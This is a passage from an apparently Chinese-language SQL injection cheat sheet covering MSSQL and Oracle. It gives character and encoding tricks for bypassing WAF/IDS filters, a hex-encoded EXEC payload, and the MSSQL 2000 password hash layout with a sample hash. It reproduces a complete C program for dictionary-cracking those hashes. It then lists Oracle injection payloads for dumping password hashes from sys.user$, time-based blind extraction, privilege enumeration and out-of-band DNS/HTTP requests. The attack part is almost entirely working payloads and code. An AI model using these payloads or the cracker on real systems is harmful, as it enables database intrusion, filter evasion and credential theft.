1D    Group Separator
1E    Record Separator
1F    Unit Separator
20    Space
25
22    "
28    (
29    )
5B    [
5D    ]

Examples:
S%E%L%E%C%T%01column%02FROM%03table;
A%%ND 1=%%%%%%%%1;

UNION(SELECT(column)FROM(table));
SELECT"table_name"FROM[information_schema].[tables];

tips:
关键字之间的百分比符号只能在ASP(x)Web应用程序上使用。
```

**AND/OR后允许的特征**

```text
01 - 20    Range
21    !
2B    +
2D    -
2E    .
5C    \
7E    ~


Example:
SELECT 1FROM[table]WHERE\1=\1AND\1=\1;

tips:
反斜杠似乎不适用于MSSQL 2000。
```

#### 编码

编码有时可以bypass WAF/IDS.

```text
URL Encoding >>>> SELECT %74able_%6eame FROM information_schema.tables;
Double URL Encoding    SELECT %2574able_%256eame FROM information_schema.tables;
Unicode Encoding    >>>>   SELECT %u0074able_%u6eame FROM information_schema.tables;
Invalid Hex Encoding (ASP)    >>>> SELECT %tab%le_%na%me FROM information_schema.tables;
Hex Encoding    >>>> ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--
HTML Entities (Needs to be verified)    %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
```

#### 密码破解

密码以0x0100开始，0x之后的第一个字节是常量; 接下来的八个字节是散列盐，其余的80个字节是两个散列，前40个字节是密码的区分大小写，而第二个40字节是大写字母。

0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457

Password Cracking A Metasploit module for JTR can be found here.

```text
MSSQL 2000 Password Cracker
This tool is designed to crack Microsoft SQL Server 2000 passwords.

 /////////////////////////////////////////////////////////////////////////////////
//
//           SQLCrackCl
//
//           This will perform a dictionary attack against the
//           upper-cased hash for a password. Once this
//           has been discovered try all case variant to work
//           out the case sensitive password.
//
//           This code was written by David Litchfield to
//           demonstrate how Microsoft SQL Server 2000
//           passwords can be attacked. This can be
//           optimized considerably by not using the CryptoAPI.
//
//           (Compile with VC++ and link with advapi32.lib
//           Ensure the Platform SDK has been installed, too!)
//
//////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
FILE *fd=NULL;
char *lerr = "\nLength Error!\n";
int wd=0;
int OpenPasswordFile(char *pwdfile);
int CrackPassword(char *hash);
int main(int argc, char *argv[])
{
             int err = 0;
        if(argc !=3)
                  {
                            printf("\n\n*** SQLCrack *** \n\n");
                            printf("C:\\>%s hash passwd-file\n\n",argv[0]);
                            printf("David Litchfield (david@ngssoftware.com)\n");
                            printf("24th June 2002\n");
                            return 0;
                  }
        err = OpenPasswordFile(argv[2]);
        if(err !=0)
         {
           return printf("\nThere was an error opening the password file %s\n",argv[2]);
         }
        err = CrackPassword(argv[1]);
        fclose(fd);
        printf("\n\n%d",wd);
        return 0;
}
int OpenPasswordFile(char *pwdfile)
{
        fd = fopen(pwdfile,"r");
        if(fd)
                  return 0;
        else
                  return 1;
}
int CrackPassword(char *hash)
{
        char phash[100]="";
        char pheader[8]="";
        char pkey[12]="";
        char pnorm[44]="";
        char pucase[44]="";
        char pucfirst[8]="";
        char wttf[44]="";
        char uwttf[100]="";
        char *wp=NULL;
        char *ptr=NULL;
        int cnt = 0;
        int count = 0;
        unsigned int key=0;
        unsigned int t=0;
        unsigned int address = 0;
        unsigned char cmp=0;
        unsigned char x=0;
        HCRYPTPROV hProv=0;
        HCRYPTHASH hHash;
DWORD hl=100;
unsigned char szhash[100]="";
int len=0;
if(strlen(hash) !=94)
          {
                  return printf("\nThe password hash is too short!\n");
          }
if(hash[0]==0x30 && (hash[1]== 'x' || hash[1] == 'X'))
          {
                  hash = hash + 2;
                  strncpy(pheader,hash,4);
                  printf("\nHeader\t\t: %s",pheader);
                  if(strlen(pheader)!=4)
                            return printf("%s",lerr);
                  hash = hash + 4;
                  strncpy(pkey,hash,8);
                  printf("\nRand key\t: %s",pkey);
                  if(strlen(pkey)!=8)
                            return printf("%s",lerr);
                  hash = hash + 8;
                  strncpy(pnorm,hash,40);
                  printf("\nNormal\t\t: %s",pnorm);
                  if(strlen(pnorm)!=40)
                            return printf("%s",lerr);
                  hash = hash + 40;
                  strncpy(pucase,hash,40);
                  printf("\nUpper Case\t: %s",pucase);
                  if(strlen(pucase)!=40)
                            return printf("%s",lerr);
                  strncpy(pucfirst,pucase,2);
                  sscanf(pucfirst,"%x",&cmp);
          }
else
          {
                  return printf("The password hash has an invalid format!\n");
          }
printf("\n\n       Trying...\n");
if(!CryptAcquireContextW(&hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
  {
          if(GetLastError()==NTE_BAD_KEYSET)
                  {
                            // KeySet does not exist. So create a new keyset
                            if(!CryptAcquireContext(&hProv,
                                                 NULL,
                                                 NULL,
                                                 PROV_RSA_FULL,
                                                 CRYPT_NEWKEYSET ))
                               {
                                        printf("FAILLLLLLL!!!");
                                        return FALSE;
                               }
           }
}
while(1)
         {
           // get a word to try from the file
           ZeroMemory(wttf,44);
           if(!fgets(wttf,40,fd))
              return printf("\nEnd of password file. Didn't find the password.\n");
           wd++;
           len = strlen(wttf);
           wttf[len-1]=0x00;
           ZeroMemory(uwttf,84);
           // Convert the word to UNICODE
           while(count < len)
                     {
                               uwttf[cnt]=wttf[count];
                               cnt++;
                               uwttf[cnt]=0x00;
                               count++;
                               cnt++;
                     }
           len --;
           wp = &uwttf;
           sscanf(pkey,"%x",&key);
           cnt = cnt - 2;
           // Append the random stuff to the end of
           // the uppercase unicode password
           t = key >> 24;
           x = (unsigned char) t;
           uwttf[cnt]=x;
           cnt++;
           t = key << 8;
           t = t >> 24;
         x = (unsigned char) t;
         uwttf[cnt]=x;
         cnt++;
         t = key << 16;
         t = t >> 24;
         x = (unsigned char) t;
         uwttf[cnt]=x;
         cnt++;
         t = key << 24;
         t = t >> 24;
         x = (unsigned char) t;
         uwttf[cnt]=x;
         cnt++;
// Create the hash
if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &hHash))
         {
                   printf("Error %x during CryptCreatHash!\n", GetLastError());
                   return 0;
         }
if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
         {
                   printf("Error %x during CryptHashData!\n", GetLastError());
                   return FALSE;
         }
CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&hl,0);
// Test the first byte only. Much quicker.
if(szhash[0] == cmp)
         {
                   // If first byte matches try the rest
                   ptr = pucase;
                   cnt = 1;
                   while(cnt < 20)
                   {
                               ptr = ptr + 2;
                               strncpy(pucfirst,ptr,2);
                               sscanf(pucfirst,"%x",&cmp);
                               if(szhash[cnt]==cmp)
                                        cnt ++;
                               else
                               {
                                        break;
                               }
                   }
                   if(cnt == 20)
                   {
                        // We've found the password
                        printf("\nA MATCH!!! Password is %s\n",wttf);
                        return 0;
                     }
             }
             count = 0;
             cnt=0;
           }
  return 0;
}
```

### 0x03 Oracle

#### 默认数据库

```text
SYSTEM    所有版本
SYSAUX    所有版本
```

#### 注释查询

以下内容可用于注释后的其余查询：

```text
--    SQL comment

Example:
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
```

#### 测试版本

```text
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;

tips:
Oracle中的所有SELECT语句都必须包含一个表。
dual是一个可用于测试的虚拟表.
```

#### Database Credentials

```text
SELECT username FROM all_users;    -- 所有版本
SELECT name, password from sys.user$; --     Privileged, <= 10g
SELECT name, spare4 from sys.user$; --     Privileged, <= 11g
```

#### 数据库名

当前数据库

```text
SELECT name FROM v$database;
SELECT instance_name FROM v$instance
SELECT global_name FROM global_name
SELECT SYS.DATABASE_NAME FROM DUAL
```

#### 用户数据库

`SELECT DISTINCT owner FROM all_tables;`

#### 服务主机名

```text
SELECT host_name FROM v$instance; (Privileged)
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
```

#### 表名和列名

猜解表名

```text
SELECT table_name FROM all_tables;
```

猜解列名：

```text
SELECT column_name FROM all_tab_columns;
```

#### 从列名查找表

```text
SELECT column_name FROM all_tab_columns WHERE table_name = 'Users';
```

#### 从表名查找列

```text
SELECT table_name FROM all_tab_tables WHERE column_name = 'password';
```

#### 一次检索多个表

```text
SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables;
```

#### 避免使用引号

与其他RDBMS不同，Oracle允许对表/列名进行编码。

```text
SELECT 0x09120911091 FROM dual;    Hex Encoding.
SELECT CHR(32)||CHR(92)||CHR(93) FROM dual;    CHR() Function.
```

#### 字符串连接

```text
SELECT 'a'||'d'||'mi'||'n' FROM dual;
```

#### 条件声明

```text
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END FROM dual
```

#### 延时

```text
Time Delay
SELECT UTL_INADDR.get_host_address('non-existant-domain.com') FROM dual;
Heavy Time Delays
AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0 AND 300 > ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1));
```

#### 提权

```text
SELECT privilege FROM session_privs;
SELECT grantee, granted_role FROM dba_role_privs; (Privileged)
```

#### DNS Requests

```text
SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;
SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;
```

#### Password Cracking

msf中的JTR模块。

